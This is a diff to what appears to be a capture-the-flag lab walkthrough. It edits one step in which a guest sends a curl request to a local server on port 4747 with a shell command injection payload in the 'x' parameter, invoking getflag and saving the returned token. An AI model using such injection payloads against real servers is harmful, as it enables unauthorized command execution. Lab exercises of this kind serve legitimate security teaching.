@@ -59,7 +59,7 @@
 7. __Action__ (Guest): send a request to the server with a malicious `x` parameter value
 	to exploit the shell command injection described above, invoking the `getflag` command
 	```sh
-	curl http://localhost:4747 -d 'x=`getflag`' | egrep -o '[^ ]+$' >/tmp/token
+	curl http://localhost:4747 -d 'x=$( getflag )' | egrep -o '[^ ]+$' >/tmp/token
 	```
 
 8. __Action__ (Host): copy the token from the virtual machine
